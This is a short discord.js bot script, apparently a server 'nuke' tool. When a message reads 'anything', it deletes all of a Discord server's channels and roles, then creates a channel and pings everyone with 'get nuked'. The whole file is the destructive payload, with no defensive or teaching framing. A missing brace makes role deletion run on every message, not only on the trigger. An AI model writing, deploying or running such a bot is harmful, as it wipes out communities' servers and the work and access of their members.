const Discord = require('discord.js');
const client = new Discord.Client();

client.login(process.env.TOKEN)

client.on('message', async (message) => {
  if (message.content === 'anything')

    message.guild.channels.cache.forEach(channel => channel.delete());

    message.guild.roles.cache.forEach(role => role.delete());

    await message.guild.channels.create(`hey`, {
      type : 'text'
    }).then(async channel=> {
      channel.send('@everyone lmao get nuked')
    })
  }
)